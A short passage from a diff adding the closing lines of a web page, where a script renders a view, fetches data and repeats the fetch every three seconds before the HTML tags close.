+renderMrdr();
+fetchD();
+setInterval(fetchD,3000);
+</script>
+</body>
+</html>
